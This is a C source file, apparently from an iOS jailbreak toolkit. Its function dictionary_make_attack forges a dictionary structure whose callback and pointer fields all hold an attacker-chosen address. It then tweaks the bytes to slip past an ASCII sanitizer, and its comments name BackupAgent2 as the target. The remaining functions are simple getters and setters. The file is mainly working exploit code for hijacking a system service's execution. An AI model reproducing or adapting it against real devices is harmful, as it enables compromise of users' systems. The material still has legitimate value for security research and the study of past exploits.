/*
 * dictionary.c
 *
 *  Created on: Sep 28, 2011
 *      Author: posixninja
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "debug.h"
#include "dictionary.h"

dictionary_t* dictionary_create() {
	dictionary_t* dict = (dictionary_t*) malloc(sizeof(dictionary_t));
	if (dict) {
		memset(dict, '\0', sizeof(dictionary_t));
	}
	return dict;
}

void dictionary_free(dictionary_t* dict) {
	if (dict) {
		free(dict);
	}
}

int dictionary_make_attack(uint32_t address, char** data, int* length) {
	int i, j = 0;

	// Allocating space for a dynamic array, and I'm just lazy.
	unsigned char* buffer = malloc(0x100);
	if (buffer == NULL) {
		error("Unable to allocate memory for dictionary string\n");
		return -1;
	}memset(buffer, '\0', 0x100);
	dictionary_t* dict = (dictionary_t*) buffer;

	// Pass our dictionary arguments here. The values added here decide which path BackupAgent2
	//  will ultimately take, so be sure to choose wisely.
	uint32_t flags = DICTIONARY_HASH_LINEAR | DICTIONARY_HAS_KEYS | DICTIONARY_HAS_COUNTS;

	dict->bits.finalized = 0;
	dict->bits.strong_values = (flags & DICTIONARY_STRONG_VALUES) ? 1 : 0;
	dict->bits.strong_values2 = 0;
	dict->bits.strong_keys = (flags & DICTIONARY_STRONG_KEYS) ? 1 : 0;
	dict->bits.strong_keys2 = 0;
	dict->bits.hash_style = (flags >> 13) & 0x3;
	dict->bits.fast_grow = (flags & DICTIONARY_AGGRESSIVE_GROWTH) ? 1 : 0;
	dict->bits.__0 = 0;
	dict->bits.num_buckets_idx = 0;
	dict->bits.used_buckets = 1028;
	dict->bits.marker = 0;
	dict->bits.deleted = 0;
	dict->bits.mutations = 2;

	dict->bits.values2_offset = 0;
	dict->bits.keys_offset = (flags & DICTIONARY_HAS_KEYS) ? 1 : 0;
	dict->bits.keys2_offset = 0;
	dict->bits.counts_offset = (flags & DICTIONARY_HAS_COUNTS) ? 1 : 0;
	dict->bits.hashes_offset = (flags & DICTIONARY_HAS_HASHCACHE) ? 1 : 0;

	dict->callbacks = address;
	dict->pointers[0] = address;
	dict->pointers[1] = address;
	dict->pointers[2] = address;

	// This debug code just prints the raw hex dump of the structure
	for (i = 0; i < 0x40; i += 4) {
		if ((i % 0x10) == 0 && i != 0) printf("\n");
		debug(" 0x%08x", *((unsigned int*) &buffer[i]));
	}
	printf("\n\n");
	// Display our hex data before sending it through the ASCII sanitizer
	dictionary_debug(dict);


	// This loop goes through each byte in the structure. If the byte is a NULL byte
	//  then add 1 to it. If the byte is greater then or equal 0x70 (out of ascii range)
	//  then just roll it back to 0x60 (chosen randomly)
	for (i = 0; i < 0x40; i++) {
		if ((i % 0x10) == 0 && i != 0) printf("\n");
		if (buffer[i] == 0) {
			buffer[i] = j++;
		}
		//if (buffer[i] >= 0x70) {
		//	buffer[i] = 0x60;
		//}
		debug("\\x%02x", buffer[i]);
	}
	printf("\n\n");

	// This debug code just prints the raw hex dump of the structure
	for (i = 0; i < 0x40; i += 4) {
		if ((i % 0x10) == 0 && i != 0) printf("\n");
		debug(" 0x%08x", *((unsigned int*) &buffer[i]));
	}
	printf("\n\n");

	// Display is again after to compare
	dictionary_debug(dict);

	buffer[0x40] = 0;
	*data = buffer;
	*length = i;
	return 0;
}

void dictionary_debug(dictionary_t* dict) {
	printf("dict->bits.hash_style = %d\n", dict->bits.hash_style);
	printf("dict->bits.values2_offset = %d\n", dict->bits.values2_offset);
	printf("dict->bits.keys_offset = %d\n", dict->bits.keys_offset);
	printf("dict->bits.keys2_offset = %d\n", dict->bits.keys2_offset);
	printf("dict->bits.counts_offset = %d\n", dict->bits.counts_offset);
	printf("dict->bits.orders_offset = %d\n", dict->bits.orders_offset);
	printf("dict->bits.hashes_offset = %d\n", dict->bits.hashes_offset);
	printf("dict->bits.num_buckets_idx = %d\n", dict->bits.num_buckets_idx);
	printf("dict->bits.used_buckets = %d\n", dict->bits.used_buckets);
	printf("dict->bits.finalized = %d\n", dict->bits.finalized);
	printf("dict->bits.fast_grow = %d\n", dict->bits.fast_grow);
	printf("dict->bits.strong_values = %d\n", dict->bits.strong_values);
	printf("dict->bits.strong_values2 = %d\n", dict->bits.strong_values2);
	printf("dict->bits.strong_keys = %d\n", dict->bits.strong_keys);
	printf("dict->bits.strong_keys2 = %d\n", dict->bits.strong_keys2);
	printf("dict->bits.marker = %d\n", dict->bits.marker);
	printf("dict->bits.deleted = %d\n", dict->bits.deleted);
	printf("dict->bits.mutations = %d\n", dict->bits.mutations);
	printf("\n");
}

dictionary_value_t* dictionary_get_values(dictionary_t* dict) {
	return (dictionary_value_t*) dict->pointers[0];
}

void dictionary_set_values(dictionary_t* dict, dictionary_value_t *ptr) {
	dict->pointers[0] = (uint32_t) ptr;
}

dictionary_value_t* dictionary_get_values2(dictionary_t* dict) {
	if (0 == dict->bits.values2_offset) error("Unable to get values2 in dictionary\n");
	return (dictionary_value_t*) dict->pointers[dict->bits.values2_offset];
}

void dictionary_set_values2(dictionary_t* dict, dictionary_value_t *ptr) {
	if (0 == dict->bits.values2_offset) error("Unable to set values2 in dictionary\n");
	dict->pointers[dict->bits.values2_offset] = (uint32_t) ptr;
}

dictionary_value_t* dictionary_get_keys(dictionary_t* dict) {
	if (0 == dict->bits.keys_offset) error("Unable to get keys in dictionary\n");
	return (dictionary_value_t*) dict->pointers[dict->bits.keys_offset];
}

void dictionary_set_keys(dictionary_t* dict, dictionary_value_t *ptr) {
	if (0 == dict->bits.keys_offset) error("Unable to set keys in dictionary\n");
	dict->pointers[dict->bits.keys_offset] = (uint32_t) ptr;
}

dictionary_value_t* dictionary_get_keys2(dictionary_t* dict) {
	if (0 == dict->bits.keys2_offset) error("Unable to get keys2 in dictionary\n");
	return (dictionary_value_t*) dict->pointers[dict->bits.keys2_offset];
}

void dictionary_set_keys2(dictionary_t* dict, dictionary_value_t *ptr) {
	if (0 == dict->bits.keys2_offset) error("Unable to set keys2 in dictionary\n");
	dict->pointers[dict->bits.keys2_offset] = (uint32_t) ptr;
}

uintptr_t* dictionary_get_counts(dictionary_t* dict) {
	if (0 == dict->bits.counts_offset) error("Unable to get counts in dictionary\n");
	return (uintptr_t*) dict->pointers[dict->bits.counts_offset];
}

void dictionary_set_counts(dictionary_t* dict, uintptr_t *ptr) {
	if (0 == dict->bits.counts_offset) error("Unable to set counts in dictionary\n");
	dict->pointers[dict->bits.counts_offset] = (uint32_t) ptr;
}

uintptr_t* dictionary_get_orders(dictionary_t* dict) {
	if (0 == dict->bits.orders_offset) error("Unable to get orders in dictionary\n");
	return (uintptr_t*) dict->pointers[dict->bits.orders_offset];
}

void dictionary_set_orders(dictionary_t* dict, uintptr_t *ptr) {
	if (0 == dict->bits.orders_offset) error("Unable to set orders in dictionary\n");
	dict->pointers[dict->bits.orders_offset] = (uint32_t) ptr;
}

uintptr_t* dictionary_get_hashes(dictionary_t* dict) {
	if (0 == dict->bits.hashes_offset) error("Unable to get hashes in dictionary\n");
	return (uintptr_t*) dict->pointers[dict->bits.hashes_offset];
}

void dictionary_set_hashes(dictionary_t* dict, uintptr_t *ptr) {
	if (0 == dict->bits.hashes_offset) error("Unable to set hashes in dictionary\n");
	dict->pointers[dict->bits.hashes_offset] = (uint32_t) ptr;
}
